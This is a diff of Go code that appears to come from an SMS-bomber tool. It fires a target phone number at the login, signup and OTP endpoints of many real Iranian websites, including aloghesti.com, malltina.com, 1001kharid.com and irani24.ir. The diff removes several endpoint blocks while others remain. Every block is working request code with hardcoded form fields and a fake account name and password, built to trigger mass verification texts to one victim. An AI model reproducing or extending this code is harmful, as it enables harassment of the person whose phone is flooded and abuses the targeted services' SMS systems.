@@ -573,75 +573,6 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// --- api.pateh.com (JSON) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobile": phone,
-        }
-        sendJSONRequest(c, ctx, "https://api.pateh.com/ath/auth/login-or-register", payload, &wg, ch)
-    }
-}(client)
-
-// --- aloghesti.com (POST, FORM) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("login_digt_countrycode", "+98")
-        formData.Set("digits_phone", getPhoneNumberNoZero(phone))
-        formData.Set("action_type", "phone")
-        formData.Set("digits_reg_name", "monsmain")
-        formData.Set("digits_process_register", "1")
-        formData.Set("sms_otp", "")
-        formData.Set("otp_step_1", "1")
-        formData.Set("digits_otp_field", "1")
-        formData.Set("digits", "1")
-        formData.Set("instance_id", "14a99a5919d973c4ac4f811d93cde732")
-        formData.Set("action", "digits_forms_ajax")
-        formData.Set("type", "login")
-        formData.Set("digits_step_1_type", "")
-        formData.Set("digits_step_1_value", "")
-        formData.Set("digits_step_2_type", "")
-        formData.Set("digits_step_2_value", "")
-        formData.Set("digits_step_3_type", "")
-        formData.Set("digits_step_3_value", "")
-        formData.Set("digits_login_email_token", "")
-        formData.Set("digits_redirect_page", "//aloghesti.com/?page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F")
-        formData.Set("digits_form", "b3b7e8ee3b")
-        formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F")
-        formData.Set("show_force_title", "1")
-        formData.Set("container", "digits_protected")
-        formData.Set("sub_action", "sms_otp")
-        sendFormRequest(c, ctx, "https://aloghesti.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-    }
-}(client)
-
-// --- api.malltina.com/check-user (JSON) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "username": phone,
-        }
-        sendJSONRequest(c, ctx, "https://api.malltina.com/check-user", payload, &wg, ch)
-    }
-}(client)
-
-// --- api.malltina.com/profiles (JSON) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "password": "Monsmain1",
-            "mobile": phone,
-            "sign_up_referral_link": "https://www.google.com/",
-        }
-        sendJSONRequest(c, ctx, "https://api.malltina.com/profiles", payload, &wg, ch)
-    }
-}(client)
-
 // --- www.1001kharid.com (POST, FORM) ---
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
@@ -665,41 +596,6 @@ tasks <- func(c *http.Client) func() {
         formData.Set("container", "digits_protected")
         formData.Set("sub_action", "sms_otp")
         sendFormRequest(c, ctx, "https://www.1001kharid.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-    }
-}(client)
-
-// --- market-backend.dgshahr.com/shop/user/user_login/ (JSON) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "phone_number": phone,
-        }
-        sendJSONRequest(c, ctx, "https://market-backend.dgshahr.com/shop/user/user_login/", payload, &wg, ch)
-    }
-}(client)
-
-// --- irani24.ir/signin?do (FORM) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("do", "")
-        formData.Set("user_mobile", phone)
-        formData.Set("confirm_code", "")
-        sendFormRequest(c, ctx, "https://irani24.ir/signin?do", formData, &wg, ch)
-    }
-}(client)
-
-// --- api.footballi.net/api/v2/user/check (JSON) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "login": phone,
-            "country_code": "+98",
-        }
-        sendJSONRequest(c, ctx, "https://api.footballi.net/api/v2/user/check", payload, &wg, ch)
     }
 }(client)
 
@@ -766,17 +662,6 @@ tasks <- func(c *http.Client) func() {
         formData.Set("_dlr_mobits", "")
         formData.Set("register", "")
         sendFormRequest(c, ctx, "https://geminja.com/login?type=register", formData, &wg, ch)
-    }
-}(client)
-
-// --- api.arzplus.net/api/v1/accounts/signup/init/ (JSON) ---
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "phone": phone,
-        }
-        sendJSONRequest(c, ctx, "https://api.arzplus.net/api/v1/accounts/signup/init/", payload, &wg, ch)
     }
 }(client)
 
